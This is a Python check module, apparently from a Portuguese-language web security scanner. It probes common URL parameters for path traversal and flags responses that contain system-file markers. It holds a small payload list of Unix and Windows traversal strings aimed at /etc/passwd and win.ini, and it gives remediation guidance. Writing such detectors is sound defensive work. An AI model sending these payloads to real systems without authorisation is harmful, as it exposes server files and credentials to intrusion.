"""Detecta Path Traversal (intrusivo).

Testa parametros comuns com payloads de travessia de diretorio e procura
marcadores fortes de arquivo de sistema na resposta, comparando com uma
resposta benigna (baseline) para reduzir falso positivo.
"""

from __future__ import annotations

from ..core.finding import Confidence, Severity
from ..core.registry import Categoria, registrar
from .base import Check

PARAMS = ["file", "path", "page", "doc", "template", "include", "name"]

PAYLOADS_UNIX = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
]
PAYLOADS_WIN = [
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
]

MARCADORES_UNIX = ("root:x:",)
MARCADORES_WIN = ("[fonts]", "for 16-bit app support")


def _tem_marcador(texto: str) -> str | None:
    for m in MARCADORES_UNIX + MARCADORES_WIN:
        if m.lower() in texto.lower():
            return m
    return None


@registrar("traversal", "Path Traversal", Categoria.INTRUSIVO)
class TraversalCheck(Check):
    def executar(self):
        achados = []
        vistos = set()

        for param in PARAMS:
            try:
                base = self.http.get(self.target.url, params={param: "valor_benigno"})
                base_marcador = _tem_marcador(base.text)
            except Exception:
                base_marcador = None

            for payload in PAYLOADS_UNIX + PAYLOADS_WIN:
                if param in vistos:
                    break
                try:
                    r = self.http.get(self.target.url, params={param: payload})
                except Exception:
                    continue
                marcador = _tem_marcador(r.text)
                if marcador and marcador != base_marcador:
                    vistos.add(param)
                    achados.append(
                        self.achado(
                            title=f"Path Traversal no parametro '{param}'",
                            severity=Severity.HIGH,
                            confidence=Confidence.FIRM,
                            url=f"{self.target.url}?{param}={payload}",
                            description="O parametro permite navegar fora do "
                            "diretorio esperado e ler arquivos do sistema de "
                            "arquivos do servidor.",
                            evidence=f"payload={payload!r} marcador encontrado: "
                            f"{marcador!r} (ausente na resposta benigna)",
                            remediation="Nao monte caminhos de arquivo a partir de "
                            "entrada do usuario; use uma lista de nomes permitidos "
                            "e normalize/valide o caminho contra o diretorio base.",
                            cwe="CWE-22",
                            owasp="A01:2021 Broken Access Control",
                        )
                    )
        return achados
